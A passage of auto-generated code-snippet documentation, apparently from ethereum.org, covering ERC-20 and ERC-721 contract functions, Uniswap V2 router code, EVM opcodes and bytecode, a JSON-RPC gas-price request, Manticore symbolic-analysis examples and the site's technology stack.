slither-disable-next-line reentrancy-events, reentrancy-benign\n        IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);\n```\n\n----------------------------------------\n\nTITLE: Emitting Approval Event in ERC-20\nDESCRIPTION: Emit an Approval event after successful allowance setting. This event notifies applications about changes in token approvals between addresses.\n\nLANGUAGE: solidity\nCODE:\n```\nemit Approval(owner, spender, amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Function Signatures in Ethereum Smart Contract\nDESCRIPTION: This code extracts the first 4 bytes of the call data which represent the function signature. It shifts right by 0xE0 (224 bits) to isolate just the first 4 bytes for function dispatch.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nD | PUSH1 0x00   | 0x00                                              \nF | CALLDATALOAD | (((First word (256 bits) of the call data)))      \n10 | PUSH1 0xe0   | 0xE0 (((First word (256 bits) of the call data))) \n12 | SHR          | (((first 32 bits (4 bytes) of the call data)))\n```\n\n----------------------------------------\n\nTITLE: Implementing Safe ETH Transfer in TransferHelper\nDESCRIPTION: Helper function for safely transferring ETH to an address. It uses a low-level call with value but no function data to send ETH, then verifies the transfer was successful.\n\nLANGUAGE: solidity\nCODE:\n```\n    function safeTransferETH(address to, uint256 value) internal {\n        (bool success, ) = to.call{value: value}(new bytes(0));\n        require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Owner-to-Operator Mapping in Vyper for ERC-721\nDESCRIPTION: A two-dimensional HashMap that associates owner addresses with a mapping of their authorized operators. This allows NFT owners to designate multiple operator addresses that can manage their tokens.\n\nLANGUAGE: vyper\nCODE:\n```\n# @dev Mapping from owner address to mapping of operator addresses.\nownerToOperators: HashMap[address, HashMap[address, bool]]\n```\n\n----------------------------------------\n\nTITLE: Implementing burn Method for ERC-721 in Vyper\nDESCRIPTION: Destroys a specific token by removing it from circulation. Only authorized parties (owner, operator, or approved address) can burn a token, maintaining proper access control.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef burn(_tokenId: uint256):\n    \"\"\"\n    @dev Burns a specific ERC721 token.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId uint256 id of the ERC721 token to be burned.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(msg.sender, _tokenId)\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    self._clearApproval(owner, _tokenId)\n    self._removeTokenFrom(owner, _tokenId)\n    log Transfer(owner, ZERO_ADDRESS, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Add Liquidity ETH Function Signature in Solidity\nDESCRIPTION: The function signature for adding liquidity to a token/ETH pair, allowing users to provide ETH directly instead of wrapped ETH (WETH).\n\nLANGUAGE: solidity\nCODE:\n```\nfunction addLiquidityETH(\n    address token,\n    uint amountTokenDesired,\n```\n\n----------------------------------------\n\nTITLE: Supporting Fee-On-Transfer Tokens in Uniswap V2 Router\nDESCRIPTION: Internal function that enables swapping of tokens that implement fee-on-transfer mechanisms. This function handles the special case where token balances change during transfers due to fees being taken.\n\nLANGUAGE: solidity\nCODE:\n```\n// **** SWAP (supporting fee-on-transfer tokens) ****\n// requires the initial amount to have already been sent to the first pair\nfunction _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual {\n```\n\n----------------------------------------\n\nTITLE: CREATE2 Opcode Implementation in EVM (F5)\nDESCRIPTION: The CREATE2 opcode (F5) creates a new contract with a deterministic address based on a salt value. It takes value, offset, length, and salt parameters and returns the calculated address.\n\nLANGUAGE: evm\nCODE:\n```\naddr = keccak256(0xff ++ address(this) ++ salt ++ keccak256(mem[ost:ost+len-1]))[12:]\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de eth_gasPrice en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour obtenir une estimation du prix actuel du gaz en wei en utilisant la méthode eth_gasPrice. Par exemple, le client Besu examine les 100 derniers blocs et renvoie le prix médian du gaz.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_gasPrice\",\"params\":[],\"id\":73}'\n// Result\n{\n  \"id\":73,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x1dfd14000\" // 8049999872 Wei\n}\n```\n\n----------------------------------------\n\nTITLE: Example Smart Contract with Revert Condition\nDESCRIPTION: A simple Solidity smart contract that reverts when the input parameter equals 65. This is used as a target for the Manticore analysis examples.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >=0.4.24 <0.6.0;\ncontract Simple {\n    function f(uint a) payable public{\n        if (a == 65) {\n            revert();\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing AmIRichAlready Smart Contract in Solidity\nDESCRIPTION: A Solidity smart contract that checks if a user has enough tokens to be considered 'rich', using an ERC20 token interface dependency.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.6.2;\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract AmIRichAlready {\n    IERC20 private tokenContract;\n    uint public richness = 1000000 * 10 ** 18;\n\n    constructor (IERC20 _tokenContract) public {\n        tokenContract = _tokenContract;\n    }\n\n    function check() public view returns (bool) {\n        uint balance = tokenContract.balanceOf(msg.sender);\n        return balance > richness;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Named Cache Sizes Array in Python\nDESCRIPTION: This code defines a Python array named 'cache_sizes' containing integer values representing cache sizes in bytes. The values increase sequentially, likely representing different cache size options or thresholds used in Ethereum's memory management system.\n\nLANGUAGE: python\nCODE:\n```\ncache_sizes = [\n16776896, 16907456, 17039296, 17170112, 17301056, 17432512, 17563072,\n17693888, 17824192, 17955904, 18087488, 18218176, 18349504, 18481088,\n18611392, 18742336, 18874304, 19004224, 19135936, 19267264, 19398208,\n19529408, 19660096, 19791424, 19922752, 20053952, 20184896, 20315968,\n20446912, 20576576, 20709184, 20840384, 20971072, 21102272, 21233216,\n21364544, 21494848, 21626816, 21757376, 21887552, 22019392, 22151104,\n22281536, 22412224, 22543936, 22675264, 22806464, 22935872, 23068096,\n23198272, 23330752, 23459008, 23592512, 23723968, 23854912, 23986112,\n24116672, 24247616, 24378688, 24509504, 24640832, 24772544, 24903488,\n25034432, 25165376, 25296704, 25427392, 25558592, 25690048, 25820096,\n25951936, 26081728, 26214208, 26345024, 26476096, 26606656, 26737472,\n26869184, 26998208, 27131584, 27262528, 27393728, 27523904, 27655744,\n27786688, 27917888, 28049344, 28179904, 28311488, 28441792, 28573504,\n28700864, 28835648, 28966208, 29096768, 29228608, 29359808, 29490752,\n29621824, 29752256, 29882816, 30014912, 30144448, 30273728, 30406976,\n30538432, 30670784, 30799936, 30932672, 31063744, 31195072, 31325248,\n31456192, 31588288, 31719232, 31850432, 31981504, 32110784, 32243392,\n32372672, 32505664, 32636608, 32767808, 32897344, 33029824, 33160768,\n33289664, 33423296, 33554368, 33683648, 33816512, 33947456, 34076992,\n34208704, 34340032, 34471744, 34600256, 34734016, 34864576, 34993984,\n35127104, 35258176, 35386688, 35518528, 35650624, 35782336, 35910976,\n36044608, 36175808, 36305728, 36436672, 36568384, 36699968, 36830656,\n36961984, 37093312, 37223488, 37355072, 37486528, 37617472, 37747904,\n37879232, 38009792, 38141888, 38272448, 38403392, 38535104, 38660672,\n38795584, 38925632, 39059264, 39190336, 39320768, 39452096, 39581632,\n39713984, 39844928, 39974848, 40107968, 40238144, 40367168, 40500032,\n40631744, 40762816, 40894144, 41023552, 41155904, 41286208, 41418304,\n41547712, 41680448, 41811904, 41942848, 42073792, 42204992, 42334912,\n42467008, 42597824, 42729152, 42860096, 42991552, 43122368, 43253696,\n43382848, 43515712, 43646912, 43777088, 43907648, 44039104, 44170432,\n44302144, 44433344, 44564288, 44694976, 44825152, 44956864, 45088448,\n45219008, 45350464, 45481024, 45612608, 45744064, 45874496, 46006208,\n46136768, 46267712, 46399424, 46529344, 46660672, 46791488, 46923328,\n47053504, 47185856, 47316928, 47447872, 47579072, 47710144, 47839936,\n47971648, 48103232, 48234176, 48365248, 48496192, 48627136, 48757312,\n48889664, 49020736, 49149248, 49283008, 49413824, 49545152, 49675712,\n49807168, 49938368, 50069056, 50200256, 50331584, 50462656, 50593472,\n50724032, 50853952, 50986048, 51117632, 51248576, 51379904, 51510848,\n51641792, 51773248, 51903296, 52035136, 52164032, 52297664, 52427968,\n52557376, 52690112, 52821952, 52952896, 53081536, 53213504, 53344576,\n53475776, 53608384, 53738816, 53870528, 54000832, 54131776, 54263744,\n54394688, 54525248, 54655936, 54787904, 54918592, 55049152, 55181248,\n55312064, 55442752, 55574336, 55705024, 55836224, 55967168, 56097856,\n56228672, 56358592, 56490176, 56621888, 56753728, 56884928, 57015488,\n57146816, 57278272, 57409216, 57540416, 57671104, 57802432, 57933632,\n58064576, 58195264, 58326976, 58457408, 58588864, 58720192, 58849984,\n58981696, 59113024, 59243456, 59375552, 59506624, 59637568, 59768512,\n59897792, 60030016, 60161984, 60293056, 60423872, 60554432, 60683968,\n60817216, 60948032, 61079488, 61209664, 61341376, 61471936, 61602752,\n61733696, 61865792, 61996736, 62127808, 62259136, 62389568, 62520512,\n62651584, 62781632, 62910784, 63045056, 63176128, 63307072, 63438656,\n63569216, 63700928, 63831616, 63960896, 64093888, 64225088, 64355392,\n64486976, 64617664, 64748608, 64879424, 65009216, 65142464, 65273792,\n65402816, 65535424, 65666752, 65797696, 65927744, 66060224, 66191296,\n66321344, 66453056, 66584384, 66715328, 66846656, 66977728, 67108672,\n67239104, 67370432, 67501888, 67631296, 67763776, 67895104, 68026304,\n68157248, 68287936, 68419264, 68548288, 68681408, 68811968, 68942912\n```\n\n----------------------------------------\n\nTITLE: Adding Constraints to Manticore Analysis\nDESCRIPTION: This example shows how to add constraints to limit the exploration space in Manticore. It uses the Z3Solver to check if constraints are feasible and demonstrates constraining symbolic variables.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\nfrom manticore.core.smtlib.solver import Z3Solver\n\nsolver = Z3Solver.instance()\n\nm = ManticoreEVM()\n\nwith open(\"example.sol\") as f:\n    source_code = f.read()\n\nuser_account = m.create_account(balance=1000)\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var)\n\nno_bug_found = True\n```\n\n----------------------------------------\n\nTITLE: Implementing Library Functions for Pricing in Uniswap V2 Router\nDESCRIPTION: A collection of public library functions that act as proxies to UniswapV2Library, providing functionality for price quotes and amount calculations during token swaps.\n\nLANGUAGE: solidity\nCODE:\n```\n// **** LIBRARY FUNCTIONS ****\nfunction quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) {\n    return UniswapV2Library.quote(amountA, reserveA, reserveB);\n}\n\nfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)\n    public\n    pure\n    virtual\n    override\n    returns (uint amountOut)\n{\n    return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut);\n}\n\nfunction getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)\n    public\n    pure\n    virtual\n    override\n    returns (uint amountIn)\n{\n    return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut);\n}\n\nfunction getAmountsOut(uint amountIn, address[] memory path)\n    public\n    view\n    virtual\n    override\n    returns (uint[] memory amounts)\n{\n    return UniswapV2Library.getAmountsOut(factory, amountIn, path);\n}\n\nfunction getAmountsIn(uint amountOut, address[] memory path)\n    public\n    view\n    virtual\n    override\n    returns (uint[] memory amounts)\n{\n    return UniswapV2Library.getAmountsIn(factory, amountOut, path);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing splitter() Method in EVM Bytecode\nDESCRIPTION: Implementation of the splitter() method that retrieves the proxy contract address from storage slot 3. This function is not payable and will revert if Ether is sent with the call.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nJUMPDEST\nCALLVALUE\nDUP1\nISZERO\nPUSH2 0x010f\nJUMPI\nPUSH1 0x00\nDUP1\nREVERT\nJUMPDEST\nPOP\nPUSH1 0x03\nSLOAD\nPUSH1 0x40\nMLOAD\nPUSH20 0xffffffffffffffffffffffffffffffffffffffff\nSWAP1\nSWAP2\nAND\nDUP2\nMSTORE\nPUSH1 0x20\nADD\nPUSH2 0x00e4\nJUMP\n```\n\n----------------------------------------\n\nTITLE: Complete Example of Running Smart Contract Analysis with Manticore\nDESCRIPTION: This comprehensive example demonstrates the full workflow of analyzing a smart contract with Manticore, including creating accounts, deploying a contract, executing a function with symbolic input, and finalizing the exploration.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\n\nm = ManticoreEVM()\n\nwith open('example.sol') as f:\n    source_code = f.read()\n\nuser_account = m.create_account(balance=1000)\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var)\n\nprint(\"Results are in {}\".format(m.workspace))\nm.finalize() # stop the exploration\n```\n\n----------------------------------------\n\nTITLE: Implementing getCrossDomainMessenger Internal Function\nDESCRIPTION: Internal function that returns the CrossDomainMessenger interface. This function can be overridden by child contracts to customize the messenger selection logic.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**********************\n     * Internal Functions *\n     **********************/\n\n    /**\n     * Gets the messenger, usually from storage. This function is exposed in case a child contract\n     * needs to override.\n     * @return The address of the cross-domain messenger contract which should be used.\n     */\n    function getCrossDomainMessenger() internal virtual returns (ICrossDomainMessenger) {\n        return ICrossDomainMessenger(messenger);\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing balanceOf Function in ERC-20\nDESCRIPTION: Defines the balanceOf function which returns the token balance of a specific account. This is an essential function for checking an address's token holdings without modifying state.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n```\n\n----------------------------------------\n\nTITLE: Getting Token Reserves in Uniswap V2\nDESCRIPTION: Retrieves the current reserves of both tokens in the pool. This is a gas-optimized way to read multiple return values from a Solidity function, discarding the timestamp which is not needed for the mint operation.\n\nLANGUAGE: solidity\nCODE:\n```\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n```\n\n----------------------------------------\n\nTITLE: Project Technology Stack List in Markdown\nDESCRIPTION: A markdown formatted list of all the technologies and tools used in the ethereum.org website project, including frontend frameworks, UI libraries, and deployment services.\n\nLANGUAGE: markdown\nCODE:\n```\n# The ethereum.org website stack\n\n- [Node.js](https://nodejs.org/)\n- [Yarn package manager](https://yarnpkg.com/cli/install)\n- [NextJS](https://nextjs.org/)\n  - React framework that provides some goodies out of the box (pages router, SSG, SSR, i18n support, Image component, etc)\n  - Configurable in `next.config.js`\n  - [NextJS Tutorial](https://nextjs.org/learn)\n  - [NextJS Docs](https://nextjs.org/docs)\n- [React](https://reactjs.org/) - A JavaScript library for building component-based user interfaces\n- [Typescript](https://www.typescriptlang.org/) - TypeScript is a strongly typed programming language that builds on JavaScript\n- [Chakra UI](https://chakra-ui.com/) - A UI library (Migration in progress)\n- [Algolia](https://www.algolia.com/) - Site indexing, rapid intra-site search results, and search analytics. [Learn more on how we implement Algolia for site search](./docs/ALGOLIA_DOCSEARCH.md).\n  - Primary implementation: `/src/components/Search/index.ts`\n- [Crowdin](https://crowdin.com/) - crowdsourcing for our translation efforts (See \"Translation initiative\" below)\n- [GitHub Actions](https://github.com/features/actions) - Manages CI/CD, and issue tracking\n- [Netlify](https://www.netlify.com/) - DNS management and primary host for `master` build.\n- [Storybook](https://storybook.js.org/) - For UI development, testing, and documentation. Check out [our storybook!](https://dev--63b7ea99632763723c7f4d6b.chromatic.com/)\n- [Chromatic](https://www.chromatic.com/) - Visual testing & UI reviews. Visit [our chromatic project](https://www.chromatic.com/builds?appId=63b7ea99632763723c7f4d6b)\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for ERC-20 Token Implementation\nDESCRIPTION: Low-level EVM bytecode implementing the ERC-20 token standard with functions for token transfers, allowance management, and balance tracking. The code includes security checks for zero addresses and proper event emissions for token transfers and approvals.\n\nLANGUAGE: evm\nCODE:\n```\nDD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x55F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x59A PUSH2 0x593 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5BB DUP5 DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH2 0x67C DUP5 PUSH2 0x5C7 PUSH2 0x9AD JUMP JUMPDEST PUSH2 0x677 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1026 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x62D PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x747 PUSH2 0x6AB PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x742 DUP6 PUSH1 0x1 PUSH1 0x0 PUSH2 0x6BC PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x831 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x806 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x831 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x814 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8FE PUSH2 0x848 PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x8F9 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1097 PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 PUSH2 0x872 PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x91C PUSH2 0x915 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xA3B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1073 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xAC1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFDE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC32 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x104E PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xCB8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFBB PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xCC3 DUP4 DUP4 DUP4 PUSH2 0xFB5 JUMP JUMPDEST PUSH2 0xD2E DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1000 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x0 DUP1 DUP8 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 